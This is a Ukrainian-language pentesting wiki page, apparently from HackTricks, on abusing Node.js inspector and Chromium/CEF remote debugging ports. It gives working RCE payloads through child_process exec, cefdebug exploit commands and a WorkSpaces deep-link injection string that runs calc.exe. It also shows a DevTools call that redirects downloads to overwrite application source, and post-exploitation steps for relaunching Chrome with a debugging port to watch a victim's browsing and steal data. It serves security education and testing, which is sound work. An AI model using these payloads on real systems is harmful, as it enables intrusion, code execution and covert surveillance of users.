# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Історичні практичні приклади включають walkthrough Multimaster та атаку на debugger Visual Studio Code CVE-2019-1414; використовуйте їх як контекст для конкретних версій, а не припускайте, що кожна сучасна ціль Electron або Chromium має такі самі примітиви.<sup>[[1]](#references)[[3]](#references)</sup>

## Основна інформація

[З документації](https://nodejs.org/learn/getting-started/debugging): Якщо процес Node.js запущено з перемикачем `--inspect`, він прослуховує підключення debugging client. **За замовчуванням** він прослуховує host і port **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.<sup>[[4]](#references)</sup>

Щоб підключитися, Inspector clients повинні знати й указати адресу host, port і UUID. Повна URL-адреса матиме приблизно такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Оскільки **debugger має повний доступ до середовища виконання Node.js**, зловмисник, який може підключитися до цього port, може отримати можливість виконувати довільний код від імені процесу Node.js (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Існує кілька способів запустити inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Коли ви запускаєте процес, що перевіряється, з’явиться щось подібне:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Процеси на основі **CEF** (**Chromium Embedded Framework**) можуть відкривати debugger за допомогою `--remote-debugging-port=9222`. Це відкриває браузер через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), а не через Node.js inspector, тому payloads на основі Node.js `process` за замовчуванням не застосовні безпосередньо.<sup>[[2]](#references)[[5]](#references)</sup>

Коли ви запускаєте браузер із debugger, з’явиться щось на кшталт:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Браузери, WebSockets і same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у веббраузері, можуть виконувати WebSocket- і HTTP-запити відповідно до моделі безпеки браузера. **Початкове HTTP-з'єднання** необхідне для **отримання унікального ідентифікатора сеансу debugger**. **same-origin-policy** **перешкоджає** вебсайтам встановлювати **це HTTP-з'єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, щоб **заголовки 'Host'** з'єднання точно вказували або **IP-адресу**, або **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ці **заходи безпеки перешкоджають exploit інспектора** для виконання коду шляхом **простого надсилання HTTP-запиту** (що можна було б зробити, використовуючи SSRF vuln).<sup>[[4]](#references)</sup>

### Запуск inspector у запущених процесах

Ви можете надіслати **сигнал SIGUSR1** запущеному процесу nodejs, щоб змусити його **запустити inspector** на порту за замовчуванням. Однак зверніть увагу, що потрібно мати достатні привілеї, тому це може надати вам **привілейований доступ до інформації всередині процесу**, але не пряме підвищення привілеїв.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Це корисно в контейнерах, оскільки **завершення процесу та запуск нового** з `--inspect` **неможливі**, бо **контейнер** буде **завершено** разом із процесом.<sup>[[6]](#references)</sup>

### Підключення до inspector/debugger

Для підключення до **браузера на основі Chromium** можна отримати доступ до URL `chrome://inspect` або `edge://inspect` для Chrome або Edge відповідно. Після натискання кнопки Configure слід переконатися, що **цільовий хост і порт** зазначені правильно. На зображенні показано приклад Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Після цього з’явиться URL для доступу до debugger, наприклад ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d — Підключення до inspector/debugger: Для підключення до браузера на основі Chromium ...](<../../images/image (674).png>)

За допомогою **командного рядка** можна підключитися до debugger/inspector:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дозволяє **знаходити локально запущені інспектори** та **впроваджувати в них code**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Зверніть увагу, що **NodeJS RCE exploits не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно перевірити API, щоб знайти цікаві способи його використання).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE у NodeJS Debugger/Inspector

> [!TIP]
> Якщо ви зайшли сюди, щоб дізнатися, як отримати [**RCE з XSS в Electron, перегляньте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Ось кілька поширених способів отримати **RCE**, коли можна **підключитися** до Node **inspector**, використовуючи щось на кшталт наведеного нижче (схоже, це **не працюватиме під час підключення до Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads протоколу Chrome DevTools

Ви можете переглянути API тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
У цьому розділі я лише перелічу цікаві способи, які, як мені відомо, використовували для експлуатації цього протоколу.

### Ін'єкція параметрів через Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) компанія Rhino security виявила, що застосунок на основі CEF **зареєстрував власний UR**I у системі (workspaces://index.html), який отримував повний URI, а потім **запускав застосунок на основі CEF** з конфігурацією, частково сформованою з цього URI.<sup>[[8]](#references)</sup>

Було виявлено, що параметри URI декодувалися з URL і використовувалися для запуску базового застосунку CEF, що дозволяло користувачу **вставити** прапорець **`--gpu-launcher`** у **командний рядок** і виконувати довільні дії.<sup>[[8]](#references)</sup>

Отже, payload на кшталт:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Виконає calc.exe.<sup>[[8]](#references)</sup>

### Перезапис файлів

Змініть папку, у яку **зберігатимуться завантажені файли**, і завантажте файл, щоб **перезаписати** часто використовуваний **source code** застосунку своїм **шкідливим кодом**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE та exfiltration

STAR Labs продемонстрували, що відкриті сервіси WebDriver/CDP можуть уможливити довільне читання файлів і RCE; у деяких конфігураціях DNS rebinding може завершити exploit chain.<sup>[[9]](#references)</sup>

Щоб ознайомитися з додатковими історичними випадками browser-automation і безпеки Chromium, дивіться write-up Counter WebDriver та issues Project Zero 773, 1742 і 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

У реальному середовищі та **після компрометації** ПК користувача, на якому використовується браузер на базі Chrome/Chromium, можна запустити процес Chrome з **активованим debugging і port-forward debugging port**, щоб отримати до нього доступ. Таким чином ви зможете **переглядати все, що жертва робить у Chrome, і викрадати конфіденційну інформацію**.<sup>[[7]](#references)</sup>

Найбільш прихований спосіб — **завершити роботу кожного процесу Chrome**, а потім викликати щось на кшталт:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - інструмент перевірки та експлуатації debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: віддалене виконання коду у Visual Studio Code через Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Посібник з налагодження Node.js - початок роботи](https://nodejs.org/learn/getting-started/debugging)
- [5] [Протокол Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Звіт corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: зловживання функцією налагодження Chrome для віддаленого спостереження за сеансами перегляду та керування ними](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: віддалене виконання коду в AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Ти говориш зі мною? - RCE у WebDriver через DNS Rebinding і CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Протидія WebDriver - від бота до RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
